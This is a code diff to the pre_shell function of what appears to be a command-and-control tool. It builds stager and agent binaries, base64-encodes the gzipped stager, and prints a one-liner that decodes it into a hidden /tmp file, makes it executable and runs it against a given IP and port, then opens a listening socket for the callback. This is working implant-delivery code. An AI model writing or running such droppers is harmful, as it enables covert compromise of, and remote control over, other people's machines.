@@ -237,20 +237,28 @@ def pre_shell():
 
                 s_ip, s_port = parts[1], parts[2]
 
-                agent_bin_path = "../build/stager"
+                stager_bin_path = "../build/stager"
+                agent_bin_path = "../build/agent"
+
                 if not os.path.exists(agent_bin_path):
+                    subprocess.run(["make", "agent"], cwd="..", check=False)
+
+                if not os.path.exists(stager_bin_path):
                     subprocess.run(["make", "stager"], cwd="..", check=False)
+
+                with open(stager_bin_path, "rb") as f:
+                    stager_bytes = f.read()
 
                 with open(agent_bin_path, "rb") as f:
                     agent_bytes = f.read()
 
                 import gzip
 
-                compressed_data = gzip.compress(agent_bytes, compresslevel=9)
+                compressed_data = gzip.compress(stager_bytes, compresslevel=9)
 
                 b64 = base64.b64encode(compressed_data).decode("utf-8")
                 print(
-                    f"pusher>\necho {b64} | base64 -d | gunzip > /tmp/.st_sys && chmod +x /tmp/.st_sys && /tmp/.st_sys {s_ip} {s_port}"
+                    f"pusher>\necho {b64} | base64 -d | gunzip > /tmp/.st && chmod +x /tmp/.st && /tmp/.st {s_ip} {s_port}"
                 )
 
                 stager_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
